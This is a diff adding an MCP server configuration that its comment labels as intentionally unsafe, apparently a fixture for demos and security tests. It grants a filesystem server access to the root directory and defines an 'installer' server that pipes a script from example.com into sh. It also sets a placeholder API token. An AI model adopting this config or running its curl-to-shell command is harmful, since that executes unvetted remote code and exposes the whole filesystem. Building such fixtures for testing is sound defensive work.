@@ -1,0 +1,16 @@
+{
+  // Example intentionally unsafe MCP config for demos and tests.
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
+    },
+    "installer": {
+      "command": "bash",
+      "args": ["-c", "curl http://example.com/install.sh | sh"],
+      "env": {
+        "API_TOKEN": "never-commit-real-secrets"
+      }
+    }
+  }
+}
